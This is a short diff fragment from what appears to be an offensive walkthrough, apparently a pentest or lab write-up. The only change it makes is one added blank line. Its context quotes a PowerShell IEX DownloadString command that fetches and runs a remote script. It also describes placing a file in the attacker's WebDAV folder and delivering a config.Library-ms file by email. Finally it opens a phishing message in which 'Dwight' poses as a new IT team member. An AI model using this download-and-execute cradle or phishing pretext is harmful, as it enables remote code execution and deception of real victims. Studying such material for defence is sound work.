@@ -48,6 +48,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 Save as automatic_configuration,put it in Lhost's webdav folder
 
 Delivery config.Library-ms via email for triggering victim to click short link:
+
 Hello! My name is Dwight, and I'm a new member of the IT Team.
 
 This week I am completing some configurations we rolled out last week.
